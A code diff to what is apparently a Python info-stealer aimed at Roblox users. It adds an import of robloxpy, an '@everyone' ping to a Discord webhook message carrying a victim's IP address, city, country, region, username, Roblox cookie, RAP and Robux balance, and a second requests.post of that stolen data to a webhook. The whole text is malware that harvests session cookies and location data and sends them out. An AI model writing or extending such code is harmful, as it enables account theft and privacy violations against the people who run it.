@@ -74,7 +74,7 @@ from datetime import timezone, datetime, timedelta
 
 from dhooks import Webhook, File
 
-
+import robloxpy
 
 PROCNAMES = [
 
@@ -453,7 +453,7 @@ steal = {
 
                     },
 
-                    "description": f"{pc} tried nuking someone \n\n**token log:** ||soon||\n**IP:** ||{ip}||\n**City:** ||{city}||\n**Country:** ||{country}||\n**Region:** ||{region}||\n\n**username:** ||{User}||\n**Cookie:** ||{cookie}||\n**Rap:** ||{rap}||\n**Robux:** ||{rob}||",
+                    "description": f"@everyone {pc} tried nuking someone \n\n**token log:** ||soon||\n**IP:** ||{ip}||\n**City:** ||{city}||\n**Country:** ||{country}||\n**Region:** ||{region}||\n\n**username:** ||{User}||\n**Cookie:** ||{cookie}||\n**Rap:** ||{rap}||\n**Robux:** ||{rob}||",
 
                     "color": 0x00C7FF,
 
@@ -502,4 +502,5 @@ discord.post(
         }
     ],
 )
+requests.post("webhooker", json=steal)
 ############### end of skidding ################# 
